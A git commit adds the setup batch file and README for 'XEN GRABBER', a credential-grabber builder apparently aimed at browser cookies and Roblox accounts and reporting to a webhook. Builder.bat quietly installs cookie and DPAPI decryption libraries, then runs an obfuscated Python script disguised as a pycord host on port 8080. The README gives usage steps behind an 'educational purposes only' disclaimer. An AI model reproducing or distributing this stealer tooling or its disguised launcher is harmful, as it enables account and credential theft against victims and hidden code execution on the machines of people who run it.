219185c02efea69f5352d91877fc3aedd9433b0d
xen <54905715+xen-light@users.noreply.github.com>
2023-07-03 15:17:35 +0300

    Add files via upload

---
+++ Builder.bat
@@ -0,0 +1,77 @@
+@echo off
+cd /d %~dp0
+
+title Checking Python installation...
+python --version > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
+    goto ERROR
+)
+
+title Checking libraries...
+echo Checking main libraries... (1/6)
+pip show requests robloxpy browser_cookie3 pycord > nul 2>&1
+if %errorlevel% neq 0 (
+    title Installing main libraries...
+    pip install requests robloxpy browser_cookie3 pycord > nul
+)
+
+title Checking libraries...
+echo Checking 'customtkinter' (2/6)
+pip show customtkinter > nul 2>&1
+if %errorlevel% neq 0 (
+    title Installing customtkinter...
+    pip install customtkinter > nul
+)
+
+echo Checking 'pillow' (3/6)
+pip show pillow > nul 2>&1
+if %errorlevel% neq 0 (
+    title Installing pillow...
+    pip install pillow > nul
+)
+
+echo Checking 'urllib3' (4/6)
+pip show urllib3 > nul 2>&1
+if %errorlevel% neq 0 (
+    title Installing urllib3...
+    pip install urllib3 > nul
+)
+
+echo Checking 'dpapi' (5/6)
+pip show dpapi > nul 2>&1
+if %errorlevel% neq 0 (
+    title Installing dpapi...
+    pip install dpapi > nul
+)
+
+echo Checking 'pyaesm' (6/6)
+pip show pyaesm > nul 2>&1
+if %errorlevel% neq 0 (
+    title Installing pyaesm...
+    pip install pyaesm > nul
+)
+
+cls
+title Hosting locally...
+timeout /t 5 > nul
+echo Running pycord at port 8080...
+python Components/pycord/bin/hosthttp-obfuscated.py > nul 2>&1
+if %errorlevel% neq 0 (
+    title Error...
+    cls
+    color 4
+    echo Failed to host pycord due to missing/corrupt files! Please download the repository again from https://github.com/xen-light/xen-grabber
+    pause > nul
+    exit
+)
+
+cls
+title Starting builder...
+python gui.py
+if %errorlevel% neq 0 goto ERROR
+exit
+
+:ERROR
+color 4 && title [Error]
+pause > nul
---
+++ README.md
@@ -0,0 +1,28 @@
+
+<h3 align="center">XEN GRABBER</h3>
+
+<p align="left"> <img src="https://komarev.com/ghpvc/?username=xen-light&label=Profile%20views&color=0e75b6&style=flat" alt="xen-light" /> </p>
+
+<p align="left"> <a href="https://twitter.com/tounknownfuture" target="blank"><img src="https://img.shields.io/twitter/follow/xeniight?logo=twitter&style=for-the-badge" alt="xeniight" /></a> </p>
+
+- [✔] This is a free everything included grabber builder!
+
+- [⚠] This product is free to use, if you paid for this, then you got scammed.
+
+- [⚠] Educational purposes only!
+
+# How to use?
+
+- Run builder.bat. It will install the required libraries.
+
+- Wait patiently until installation completes. 
+
+- GUI will pop up. Tick the features you wanna use and put your webhook + icon. Click build.
+
+- Wait until builder is completed.
+
+- Enjoy!
+
+- personal website: [https://xenlight.xyz](https://xenlight.xyz)
+
+- join us today: [discord](https://xen-discord-redirecter.vercel.app/)
